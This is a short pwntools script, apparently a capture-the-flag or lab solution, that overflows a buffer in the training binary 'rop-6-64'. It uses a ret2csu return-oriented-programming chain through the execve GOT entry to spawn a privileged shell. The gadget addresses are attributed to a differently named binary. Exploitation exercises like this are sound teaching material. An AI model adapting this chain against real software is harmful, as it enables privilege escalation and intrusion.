from pwn import *

GARB = 'bbbbbbbb'

# sh is a binary that raises priviliges and executes a shell
# This code requires a symbolic link from read to sh to work

# Addresses needed for the attack
pop_rdi_ret_addr = 0x400703 # From ROPgadget --binary ./rop-no-pop-rdx-64
pop_r12_r13_r14_r15_ret_addr = 0x4006fc # From ROPgadget --binary ./rop-no-pop-rdx-64
csu_addr = 0x4006d6 # Address inside the function __libc_csu_init where we want to start

read_string_addr = 0x400371 # Address of 'read' in the program code
execve_got_addr = 0x601030  # Holds pointer to execve.  GOT table addr

# Pop the read string into rdi, execve pointer to r12, 0 to r13/r14, and read string to r15.  Go to the spot in init to call execve.
inp = 'a' * 0x80 + GARB + p64(pop_rdi_ret_addr) + p64(read_string_addr)
inp = inp + p64(pop_r12_r13_r14_r15_ret_addr) + p64(execve_got_addr) + p64(0) + p64(0) + p64(read_string_addr) + p64(csu_addr)

# Launch processs and send rop chain
p = process('./rop-6-64')

# Send attack
p.sendline(inp)

# Use privilleged shell to get the flag
p.interactive()
